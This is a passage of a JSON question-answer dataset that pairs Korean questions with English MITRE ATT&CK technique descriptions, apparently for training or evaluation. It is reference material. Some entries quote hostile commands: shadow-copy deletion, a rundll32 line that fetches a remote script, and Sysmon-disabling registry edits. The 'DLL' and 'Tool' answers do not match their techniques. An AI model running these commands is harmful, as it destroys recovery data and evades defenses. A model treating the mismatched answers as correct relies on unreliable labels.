      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1113",
        "entity_id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688"
      }
    },
    {
      "question": "Obfuscated Files or Information 공격 기법은 무엇인가?",
      "answer": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1027",
        "entity_id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a"
      }
    },
    {
      "question": "Keylogging 공격 기법은 무엇인가?",
      "answer": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1056.001",
        "entity_id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4"
      }
    },
    {
      "question": "Spearphishing Attachment 공격 기법은 무엇인가?",
      "answer": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1566.001",
        "entity_id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597"
      }
    },
    {
      "question": "Windows Management Instrumentation 공격 기법은 무엇인가?",
      "answer": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1047",
        "entity_id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055"
      }
    },
    {
      "question": "Windows Service 공격 기법은 무엇인가?",
      "answer": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1543.003",
        "entity_id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32"
      }
    },
    {
      "question": "Security Software Discovery 공격 기법은 무엇인가?",
      "answer": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n\n### Windows\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.\n\n### Mac\n\nIt's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1518.001",
        "entity_id": "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384"
      }
    },
    {
      "question": "Visual Basic 공격 기법은 무엇인가?",
      "answer": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1059.005",
        "entity_id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67"
      }
    },
    {
      "question": "Local Data Staging 공격 기법은 무엇인가?",
      "answer": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1074.001",
        "entity_id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c"
      }
    },
    {
      "question": "Standard Encoding 공격 기법은 무엇인가?",
      "answer": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1132.001",
        "entity_id": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c"
      }
    },
    {
      "question": "Query Registry 공격 기법은 무엇인가?",
      "answer": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1012",
        "entity_id": "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896"
      }
    },
    {
      "question": "Disable or Modify Tools 공격 기법은 무엇인가?",
      "answer": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may trigger a denial-of-service attack via legitimate system processes. It has been previously observed that the Windows Time Travel Debugging (TTD) monitor driver can be used to initiate a debugging session for a security tool (e.g., an EDR) and render the tool non-functional.  By hooking the debugger into the EDR process, all child processes from the EDR will be automatically suspended. The attacker can terminate any EDR helper processes (unprotected by Windows Protected Process Light) by abusing the Process Explorer driver. In combination this will halt any attempt to restart services and cause the tool to crash.(Citation: Cocomazzi FIN7 Reboot)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) For example, adversaries may abuse the Windows process mitigation policy to block certain endpoint detection and response (EDR) products from loading their user-mode code via DLLs. By spawning a process with the PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON attribute using API calls like UpdateProcThreadAttribute, adversaries may evade detection by endpoint security solutions that rely on DLLs that are not signed by Microsoft. Alternatively, they may add new directories to an EDR tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1562.001",
        "entity_id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579"
      }
    },
    {
      "question": "Non-Application Layer Protocol 공격 기법은 무엇인가?",
      "answer": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\n\nIn ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host’s backdoor, regardless of network segmentation or firewall rules in place.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1095",
        "entity_id": "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b"
      }
    },
    {
      "question": "Rundll32 공격 기법은 무엇인가?",
      "answer": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks.(Citation: This is Security Command Line Confusion)\n\nThreat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.(Citation: lolbas project Zipfldr.dll)(Citation: lolbas project Ieframe.dll)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1218.011",
        "entity_id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5"
      }
    },
    {
      "question": "DLL 공격 기법은 무엇인가?",
      "answer": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks.(Citation: This is Security Command Line Confusion)\n\nThreat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.(Citation: lolbas project Zipfldr.dll)(Citation: lolbas project Ieframe.dll)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1574.001",
        "entity_id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34"
      }
    },
    {
      "question": "Tool 공격 기법은 무엇인가?",
      "answer": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1588.002",
        "entity_id": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0"
      }
    },
    {
      "question": "Software Packing 공격 기법은 무엇인가?",
      "answer": "Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.\n\nAdversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1027.002",
        "entity_id": "attack-pattern--deb98323-e13f-4b0c-8d94-175379069062"
      }
    },
    {
      "question": "Remote System Discovery 공격 기법은 무엇인가?",
      "answer": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097), <code>net view</code> using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1018",
        "entity_id": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735"
      }
    },
    {
      "question": "Local Storage Discovery 공격 기법은 무엇인가?",
      "answer": "Adversaries may enumerate local drives, disks, and/or volumes and their attributes like total or free space and volume serial number. This can be done to prepare for ransomware-related encryption, to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0109), or as a precursor to [Direct Volume Access](https://attack.mitre.org/techniques/T1006). \n\nOn ESXi systems, adversaries may use [Hypervisor CLI](https://attack.mitre.org/techniques/T1059/012) commands such as `esxcli` to list storage connected to the host as well as `.vmdk` files.(Citation: TrendMicro)(Citation: TrendMicro ESXI Ransomware)\n\nOn Windows systems, adversaries can use `wmic logicaldisk get` to find information about local network drives. They can also use `Get-PSDrive` in PowerShell to retrieve drives and may additionally use Windows API functions such as `GetDriveType`.(Citation: Trend Micro MUSTANG PANDA PUBLOAD HIUPAN SEPTEMBER 2024)(Citation: Volexity)\n\nLinux has commands such as `parted`, `lsblk`, `fdisk`, `lshw`, and `df` that can list information about disk partitions such as size, type, file system types, and free space. The command `diskutil` on MacOS can be used to list disks while `system_profiler SPStorageDataType` can additionally show information such as a volume’s mount path, file system, and the type of drive in the system. \n\nInfrastructure as a Service (IaaS) cloud providers also have commands for storage discovery such as `describe volume` in AWS, `gcloud compute disks list` in GCP, and `az disk list` in Azure.(Citation: AWS docs describe volumes)(Citation: GCP gcloud compute disks list)(Citation: azure az disk)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1680",
        "entity_id": "attack-pattern--f2514ae4-4e9b-4f26-a5ba-c4ae85fe93c3"
      }
    },
    {
      "question": "System Network Connections Discovery 공격 기법은 무엇인가?",
      "answer": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, the command `esxi network ip connection list` can be used to list active network connections.(Citation: Sygnia ESXi Ransomware 2025)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1049",
        "entity_id": "attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475"
      }
    },
    {
      "question": "System Time Discovery 공격 기법은 무엇인가?",
      "answer": "An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd) On ESXi servers, `esxcli system clock get` can be used for the same purpose.\n\nIn addition, system calls – such as <code>time()</code> – have been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified 